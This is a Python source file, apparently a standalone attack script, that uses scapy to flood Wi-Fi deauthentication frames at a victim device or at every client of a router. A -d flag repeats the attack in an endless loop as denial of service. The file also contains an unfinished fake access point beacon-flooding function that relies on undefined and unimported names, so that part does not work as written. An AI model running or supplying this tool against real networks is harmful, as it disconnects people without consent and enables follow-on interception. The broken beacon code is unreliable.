import signal
import argparse
from scapy.all import sendp, os
from scapy.layers.dot11 import RadioTap, Dot11, Dot11Deauth


# Sending deauth message
# Prerequisites:
# attacker and victim have wifi.
# attacker have the network interface in monitor mode
def deauth(macVictim, interface, gateway):
    packet = RadioTap() / Dot11(type=0, subtype=12, addr1=macVictim, addr2=gateway, addr3=gateway) / Dot11Deauth(reason=2)
    sendp(packet, inter=0.1, count=100, iface=interface, verbose=1)
    
def fakeap():
    packet = RadioTap() / Dot11(addr1 = broadcast, addr2 = bssid, addr3 = bssid) / Dot11Beacon(cap = 0x1104) / Dot11Elt(ID=0, info="ssid") / Dot11Elt(ID=1, info="\x82\x84\x8b\x96\x24\x30\x48\x6c") / Dot11Elt(ID=3, info="\x0b") / Dot11Elt(ID=5, info="\x00\x01\x00\x00")
    sendp(packet, count = 10000, inter = 0.2)


if __name__ == "__main__":
    macVictim = ""
    parser = argparse.ArgumentParser(
        description="This script disconnect a device from a router. "
                    "It can be used to with all devices (ff:ff:ff:ff:ff:ff). "
                    "Prerequisites: You and your victim need to have wifi. ")
    parser.add_argument("-i", "--interface", required=True, help="Network interface")
    parser.add_argument("-v", "--victim", required=False,
                        help="Victim MAC address. Default ff:ff:ff:ff:ff:ff (send to broadcast, "
                             "it will affect all devices connected by wifi)")  # default ff:ff:ff:ff:ff:ff
    parser.add_argument("-b", "--bssid", required=True, help="Gateway MAC address")
    parser.add_argument("-d", "--dos", required=False, action="store_true", help="This option put de deauthentication "
                                                                                 "function in an endless loop")
    args = parser.parse_args()

    if args.victim is None:
        macVictim = "ff:ff:ff:ff:ff:ff"
    else:
        macVictim = args.victim

    if args.dos:
        print("Press enter to kill the program")
        newpid = os.fork()
        if newpid == 0:
            while True:
                deauth(macVictim, args.interface, args.bssid)
        else:
            input('')
            os.kill(newpid, signal.SIGKILL)
    else:
        deauth(macVictim, args.interface, args.bssid)
